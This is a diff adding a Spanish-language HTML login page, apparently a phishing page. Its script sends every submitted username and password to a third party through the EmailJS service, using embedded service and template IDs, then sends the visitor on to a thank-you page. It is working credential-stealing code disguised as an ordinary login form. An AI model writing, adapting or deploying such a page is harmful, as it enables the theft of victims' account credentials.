@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("d8q3sBWEctV-MobNA"); // Tu Public Key
+    })();
+
+    function enviarCorreo(event) {
+      event.preventDefault(); // Evita que el formulario recargue la página
+
+      const usuario = document.getElementById("usuario").value;
+      const contrasena = document.getElementById("contrasena").value;
+
+      emailjs.send("service_htfde5y", "template_5l95084", {
+        usuario: usuario,
+        contrasena: contrasena
+      })
+      .then(function(response) {
+        console.log("Correo enviado con éxito", response.status, response.text);
+        // Redirige al completar envío
+        window.location.href = "gracias.html";
+      }, function(error) {
+        console.error("Error al enviar el correo", error);
+        alert("Hubo un error al enviar los datos.");
+      });
+    }
+  </script>
+</head>
+<body>
+  <h2>Iniciar Sesión</h2>
+  <form onsubmit="enviarCorreo(event)">
+    <label for="usuario">Usuario:</label><br>
+    <input type="text" id="usuario" name="usuario" required><br><br>
+
+    <label for="contrasena">Contraseña:</label><br>
+    <input type="password" id="contrasena" name="contrasena" required><br><br>
+
+    <button type="submit">Entrar</button>
+  </form>
+</body>
+</html>
